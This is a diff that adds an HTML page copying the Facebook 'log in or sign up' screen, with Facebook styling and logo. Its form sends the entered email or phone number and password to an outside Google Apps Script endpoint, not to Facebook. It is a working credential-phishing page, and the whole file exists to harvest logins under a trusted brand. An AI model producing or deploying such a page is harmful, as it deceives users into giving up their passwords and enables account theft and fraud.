@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: center;
+    }
+    .login-box img {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .login-button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .login-button:hover {
+      background-color: #165ecc;
+    }
+    .footer-text {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #606770;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
+      <form method="POST" action="https://script.google.com/macros/s/AKfycbzt4GJUQAlTU-zkeDYXBfD-kacVd4klNfQzehLtH_4AExNzXIsaAWn0bymcTnZ3fz60/exec">
+        <input class="input-field" type="text" name="username" placeholder="Email or Phone Number" required>
+        <input class="input-field" type="password" name="password" placeholder="Password" required>
+        <button class="login-button" type="submit">Log In</button>
+      </form>
+      <div class="footer-text">Forgot password? • Sign Up for Facebook</div>
+    </div>
+  </div>
+</body>
+</html>
